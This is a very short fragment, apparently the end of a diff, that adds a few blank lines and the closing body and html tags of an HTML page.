+
+
+
+  </body>
+  </html>
